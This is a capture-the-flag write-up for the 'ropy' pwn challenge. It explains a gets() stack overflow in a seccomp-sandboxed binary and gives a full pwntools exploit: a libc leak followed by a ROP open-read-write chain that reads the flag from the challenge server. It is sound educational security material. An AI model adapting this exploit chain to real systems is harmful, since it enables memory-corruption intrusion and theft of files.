# ropy — PWN Writeup

**Author:** Luma  
**Category:** PWN  
**Remote:** `nc 34.40.124.58 30427`

## Reconnaissance

We are given a stripped 64-bit ELF binary (`main`), the remote libc (`libc.so.6`), and the dynamic linker (`ld-linux-x86-64.so.2`).

```
$ checksec dev/main
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
```

Key takeaways: **No PIE**, **No canary**, NX enabled. SHSTK/IBT headers are present but not enforced by the kernel.

## Reverse Engineering

Disassembling the binary reveals three main phases:

### 1. Anti-debug / fd pollution (`0x40137d`)

The binary reads 4 bytes from `/dev/urandom` to seed `srand()`, then computes `N = rand() % 0x6001 + 0x1000` and opens `/dev/null` that many times (4096–28672 times) without closing them. This means the file descriptor returned by any subsequent `open()` call will be some unpredictable large number — we can't hardcode the fd.

After the loop it `sleep(3)`s.

### 2. Seccomp sandbox (`0x401448`)

A seccomp filter is installed with `SCMP_ACT_KILL` as default, allowing only three syscalls:

| Syscall | Number |
|---------|--------|
| `read`  | 0      |
| `write` | 1      |
| `open`  | 2      |

This means no `execve`, no `mmap`, no `mprotect` — we must use an **open-read-write (ORW)** chain.

### 3. Vulnerable function (`0x401566`)

```asm
push   rbp
mov    rbp, rsp
add    rsp, -0x80          ; 128-byte buffer
lea    rax, [rbp-0x80]
mov    rdi, rax
call   gets                ; unbounded read → buffer overflow
leave
ret
```

The buffer is 0x80 (128) bytes. With 8 bytes for the saved `rbp`, we need **0x88 = 136 bytes** of padding to reach the return address.

## Exploitation Strategy

Since we can only use `open`/`read`/`write` syscalls, the plan is a two-stage ROP attack:

**Stage 1 — Leak libc base:**
1. Overflow the buffer to build a ROP chain that calls `puts(open@GOT)` to leak the resolved address of `open` in libc.
2. Return to the vulnerable function for a second input.

**Stage 2 — ORW chain:**
1. `gets(bss_addr)` — read the string `"flag.txt"` into a writable BSS address.
2. `open("flag.txt", 0)` via `syscall` — the returned fd (in `rax`) is unknown.
3. `xchg eax, edi` — transfer the fd from `rax` into `rdi` for the next syscall.
4. `read(fd, bss_buf, 200)` via `syscall` — read flag contents into BSS.
5. `write(1, bss_buf, 200)` via `syscall` — print the flag to stdout.

### Why `xchg eax, edi` and not `mov edi, eax`?

ROPgadget finds `mov edi, eax; ret` at libc offset `0x233e2f`, but this address falls in libc's **debug/DWARF section**, which is **not mapped into memory** at runtime (outside all `PT_LOAD` segments). Jumping there causes an immediate SIGSEGV.

The correct gadget is `xchg eax, edi; ret` at offset `0x14a225`, located within the executable `PT_LOAD RX` segment (`0x28000`–`0x1bc3c1`).

### Gadgets Used

**From the binary (no PIE):**

| Gadget | Address |
|--------|---------|
| `pop rdi; ret` | `0x401316` |
| `ret` | `0x40101a` |
| `puts@plt` | `0x401154` |
| `gets@plt` | `0x4011b4` |
| `open@GOT` | `0x404068` |
| Vulnerable fn | `0x401566` |

**From libc (offsets):**

| Gadget | Offset |
|--------|--------|
| `pop rsi; ret` | `0x2be51` |
| `pop rdx; pop rcx; pop rbx; ret` | `0x108b73` |
| `pop rax; ret` | `0x45eb0` |
| `syscall; ret` | `0x91316` |
| `xchg eax, edi; ret` | `0x14a225` |

## Exploit

```python
#!/usr/bin/env python3
from pwn import *
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

context.binary = e = ELF(os.path.join(SCRIPT_DIR, 'dev/main'))
libc            = ELF(os.path.join(SCRIPT_DIR, 'dev/libc.so.6'))

VULN_FN   = 0x401566
POP_RDI   = 0x401316
RET       = 0x40101a
PUTS_PLT  = e.plt['puts']
GETS_PLT  = e.plt['gets']
OPEN_GOT  = e.got['open']

BSS_FLAG_NAME = 0x4041a0
BSS_FLAG_BUF  = 0x4041d0
OVERFLOW      = 0x88

OFF_POP_RSI         = 0x2be51
OFF_POP_RDX_RCX_RBX = 0x108b73
OFF_SYSCALL         = 0x91316
OFF_POP_RAX         = 0x45eb0
OFF_XCHG_EAX_EDI   = 0x14a225

io = remote('34.40.124.58', 30427)

# Wait for the binary to finish its anti-debug loop + sleep
io.recvuntil(b'Hello! What is your name?\n', timeout=60)

# ── Stage 1: leak libc ──
io.sendline(b'A' * OVERFLOW + flat(
    POP_RDI, OPEN_GOT, RET, PUTS_PLT, VULN_FN
))

leak      = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.sym['open']
log.success(f'libc base = {hex(libc_base)}')

# ── Stage 2: ORW chain ──
io.recvuntil(b'Hello! What is your name?\n', timeout=10)

pop_rsi         = libc_base + OFF_POP_RSI
pop_rdx_rcx_rbx = libc_base + OFF_POP_RDX_RCX_RBX
syscall_ret     = libc_base + OFF_SYSCALL
pop_rax         = libc_base + OFF_POP_RAX
xchg_eax_edi    = libc_base + OFF_XCHG_EAX_EDI

io.sendline(b'A' * OVERFLOW + flat(
    # gets("flag.txt" → BSS)
    POP_RDI, BSS_FLAG_NAME, GETS_PLT,
    # open("flag.txt", 0)
    POP_RDI, BSS_FLAG_NAME, pop_rsi, 0,
    pop_rdx_rcx_rbx, 0, 0, 0, pop_rax, 2, syscall_ret,
    # xchg eax,edi → rdi = fd
    xchg_eax_edi,
    # read(fd, buf, 200)
    pop_rsi, BSS_FLAG_BUF, pop_rdx_rcx_rbx, 200, 0, 0,
    pop_rax, 0, syscall_ret,
    # write(1, buf, 200)
    POP_RDI, 1, pop_rsi, BSS_FLAG_BUF,
    pop_rdx_rcx_rbx, 200, 0, 0, pop_rax, 1, syscall_ret,
))
io.sendline(b'flag.txt')

print(io.recv(512, timeout=10))
```

## Flag

```
ROCSC{960bf98820d962e0b4a15d12485c075aab5dc873568fecaf6d344b6474de2c98}
```
